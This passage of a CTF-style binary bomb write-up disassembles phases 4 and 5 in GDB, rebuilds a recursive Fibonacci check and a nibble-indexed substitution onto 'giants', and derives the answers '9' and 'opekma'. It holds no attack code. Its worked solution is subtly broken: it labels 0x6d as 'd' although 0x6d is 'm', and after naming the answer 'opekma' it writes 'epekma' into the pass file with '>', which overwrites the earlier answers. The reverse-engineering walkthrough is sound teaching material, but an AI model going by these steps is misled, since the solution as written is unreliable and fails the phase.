   0x08048cda <+58>:	mov    esp,ebp
   0x08048cdc <+60>:	pop    ebp
   0x08048cdd <+61>:	ret
End of assembler dump.
```

It is simply a function of calculating fibonacci with as argument the index of
the element in position N in the sequence of fibonacci. This can be write as :

```c
unsigned int	func4(unsigned int n) {

	if (n <= 1)
		return 1;
	return func4(n - 1) + func4(n - 2); 

}
```
Or for a better understanding of the assembly code of the function `func4` :
```c
unsigned int	func4(unsigned int n) {

	int esi;
	int eax;
	int ebx = n;

	if (ebx <= 1) {
		eax = 1;
	} else {
		eax = ebx - 1;
		eax = func4(eax);
		esi = eax;
		eax = ebx - 2;
		eax = func4(eax);
		eax += esi;

	}

	return eax;

}
```
Let's rewrite the assembly code of the `func4` function with, in comment, the C
code that we wrote.
```assembly
   0x08048ca0 <+0>:	push   ebp
   0x08048ca1 <+1>:	mov    ebp,esp
   0x08048ca3 <+3>:	sub    esp,0x10
   0x08048ca6 <+6>:	push   esi
   0x08048ca7 <+7>:	push   ebx
   0x08048ca8 <+8>:	mov    ebx,DWORD PTR [ebp+0x8]  ; ebx = n;
   0x08048cab <+11>:	cmp    ebx,0x1                  ; if (ebx <= 1) -> jump <func4+48>
   0x08048cae <+14>:	jle    0x8048cd0 <func4+48>
   0x08048cb0 <+16>:	add    esp,0xfffffff4
   0x08048cb3 <+19>:	lea    eax,[ebx-0x1]            ; eax = ebx - 1;
   0x08048cb6 <+22>:	push   eax
   0x08048cb7 <+23>:	call   0x8048ca0 <func4>        ; eax = func4(eax);
   0x08048cbc <+28>:	mov    esi,eax                  ; esi = eax;
   0x08048cbe <+30>:	add    esp,0xfffffff4
   0x08048cc1 <+33>:	lea    eax,[ebx-0x2]            ; eax = ebx - 2;
   0x08048cc4 <+36>:	push   eax
   0x08048cc5 <+37>:	call   0x8048ca0 <func4>        ; eax = func4(eax);
   0x08048cca <+42>:	add    eax,esi                  ; eax += esi;
   0x08048ccc <+44>:	jmp    0x8048cd5 <func4+53>     ; jump <func4+53>
   0x08048cce <+46>:	mov    esi,esi
   0x08048cd0 <+48>:	mov    eax,0x1                  ; eax = 1;
   0x08048cd5 <+53>:	lea    esp,[ebp-0x18]
   0x08048cd8 <+56>:	pop    ebx
   0x08048cd9 <+57>:	pop    esi
   0x08048cda <+58>:	mov    esp,ebp
   0x08048cdc <+60>:	pop    ebp
   0x08048cdd <+61>:	ret                             ; return eax

```
We know now the expected input value -> **9**

```shell
echo '9' >> pass
```

<br>

</details>


### phase_5


```shell
gef➤  disass phase_5
Dump of assembler code for function phase_5:
   0x08048d2c <+0>:	push   ebp
   0x08048d2d <+1>:	mov    ebp,esp
   0x08048d2f <+3>:	sub    esp,0x10
   0x08048d32 <+6>:	push   esi
   0x08048d33 <+7>:	push   ebx
   0x08048d34 <+8>:	mov    ebx,DWORD PTR [ebp+0x8]
   0x08048d37 <+11>:	add    esp,0xfffffff4
   0x08048d3a <+14>:	push   ebx
   0x08048d3b <+15>:	call   0x8049018 <string_length>
   0x08048d40 <+20>:	add    esp,0x10
   0x08048d43 <+23>:	cmp    eax,0x6
   0x08048d46 <+26>:	je     0x8048d4d <phase_5+33>
   0x08048d48 <+28>:	call   0x80494fc <explode_bomb>
   0x08048d4d <+33>:	xor    edx,edx
   0x08048d4f <+35>:	lea    ecx,[ebp-0x8]
   0x08048d52 <+38>:	mov    esi,0x804b220
   0x08048d57 <+43>:	mov    al,BYTE PTR [edx+ebx*1]
   0x08048d5a <+46>:	and    al,0xf
   0x08048d5c <+48>:	movsx  eax,al
   0x08048d5f <+51>:	mov    al,BYTE PTR [eax+esi*1]
   0x08048d62 <+54>:	mov    BYTE PTR [edx+ecx*1],al
   0x08048d65 <+57>:	inc    edx
   0x08048d66 <+58>:	cmp    edx,0x5
   0x08048d69 <+61>:	jle    0x8048d57 <phase_5+43>
   0x08048d6b <+63>:	mov    BYTE PTR [ebp-0x2],0x0
   0x08048d6f <+67>:	add    esp,0xfffffff8
   0x08048d72 <+70>:	push   0x804980b
   0x08048d77 <+75>:	lea    eax,[ebp-0x8]
   0x08048d7a <+78>:	push   eax
   0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>
   0x08048d80 <+84>:	add    esp,0x10
   0x08048d83 <+87>:	test   eax,eax
   0x08048d85 <+89>:	je     0x8048d8c <phase_5+96>
   0x08048d87 <+91>:	call   0x80494fc <explode_bomb>
   0x08048d8c <+96>:	lea    esp,[ebp-0x18]
   0x08048d8f <+99>:	pop    ebx
   0x08048d90 <+100>:	pop    esi
   0x08048d91 <+101>:	mov    esp,ebp
   0x08048d93 <+103>:	pop    ebp
   0x08048d94 <+104>:	ret
End of assembler dump.
```

First of all, we know that the input string must have a length of
6 characters, this can be deduced from this set of instructions:

```shell
   0x08048d3b <+15>:	call   0x8049018 <string_length>
   0x08048d40 <+20>:	add    esp,0x10
   0x08048d43 <+23>:	cmp    eax,0x6
   0x08048d46 <+26>:	je     0x8048d4d <phase_5+33>
   0x08048d48 <+28>:	call   0x80494fc <explode_bomb>
```

then understand the instructions that follow:

```shell
   0x08048d4d <+33>:	xor    edx,edx                   ; initialize to 0 edx
   0x08048d4f <+35>:	lea    ecx,[ebp-0x8]             ; ecx takes as value the pointer to the input string
   0x08048d52 <+38>:	mov    esi,0x804b220             ; esi takes as value an adress (we will know what it is further)
   0x08048d57 <+43>:	mov    al,BYTE PTR [edx+ebx*1]   ; we isolate the character present at an offset of edx from the start of the input string (ebx).
   0x08048d5a <+46>:	and    al,0xf                    ; we take only value of the four first bits. (value between 0 and 15)
   0x08048d5c <+48>:	movsx  eax,al                    ; the entire eax register takes the value of al
   0x08048d5f <+51>:	mov    al,BYTE PTR [eax+esi*1]   ; we isolate the byte (it seems like a character...) present at an offset of eax from the address 0x804b220.
   0x08048d62 <+54>:	mov    BYTE PTR [edx+ecx*1],al   ; we replace the character previously extracted from our input string with the new value we just found.
   0x08048d65 <+57>:	inc    edx                       ; we increment edx...
   0x08048d66 <+58>:	cmp    edx,0x5                   ; ...until the value is be greater than 5...
   0x08048d69 <+61>:	jle    0x8048d57 <phase_5+43>    ; ...and so, we can continue the execution.
```

And if we check what there is behind address `0x804b220`, we find a string !

```shell
gef➤  x/s 0x804b220
0x804b220:	"isrveawhobpnutfg\260\001"
```

<br>

Perfect, let's go further :

```shell
   ...
   0x08048d72 <+70>:	push   0x804980b                     ; we push an address on the stack
   0x08048d77 <+75>:	lea    eax,[ebp-0x8]                 ; eax takes as value the pointer to our previously modified input string.
   0x08048d7a <+78>:	push   eax                           ; eax is pushed on the stack
   0x08048d7b <+79>:	call   0x8049030 <strings_not_equal> ; function <strings_not_equal> is called with its arguments on the stack.
   0x08048d80 <+84>:	add    esp,0x10
   0x08048d83 <+87>:	test   eax,eax                       ; we test eax...
   0x08048d85 <+89>:	je     0x8048d8c <phase_5+96>        ; ... if eax is equal to 0, we can end the function normally ...
   0x08048d87 <+91>:	call   0x80494fc <explode_bomb>      ; ... else, the bomb explodes !
   0x08048d8c <+96>:	lea    esp,[ebp-0x18]
   0x08048d8f <+99>:	pop    ebx
   0x08048d90 <+100>:	pop    esi
   0x08048d91 <+101>:	mov    esp,ebp
   0x08048d93 <+103>:	pop    ebp
   0x08048d94 <+104>:	ret
```

So, to pass this phase, the `strings not equal` function must return 0.
And to do this, the strings must be equal. We now look at which string is
hidden behind address `0x804980b`

```shell
gef➤  x/s 0x804980b
0x804980b:	"giants"
```

<br>

Finally, we have all information to reverse this phase letter by letter :

- **g** is present at an offset **0xf** from the start of `isrveawhobpnutfg` ->
**o = 0x6f** with as fist half byte **0xf**
- **i** is present at an offset **0x0** from the start of `isrveawhobpnutfg` ->
**p = 0x70** with as fist half byte **0x0**
- **a** is present at an offset **0x5** from the start of `isrveawhobpnutfg` ->
**e = 0x65** with as fist half byte **0x5**
- **n** is present at an offset **0xb** from the start of `isrveawhobpnutfg` ->
**k = 0x6b** with as fist half byte **0xb**
- **t** is present at an offset **0xd** from the start of `isrveawhobpnutfg` ->
**d = 0x6d** with as fist half byte **0xd**
- **s** is present at an offset **0x1** from the start of `isrveawhobpnutfg` ->
**a = 0x61** with as fist half byte **0x1**

The good answer is `opekma`

```shell
echo 'epekma' > pass
```

> Note: In fact, there are many other possibilities, but in the index present in the
> `README` from laurie's `HOME`, we know that the first character must be
> `o` and we take the characters that seem the most obvious to us for
> continue.
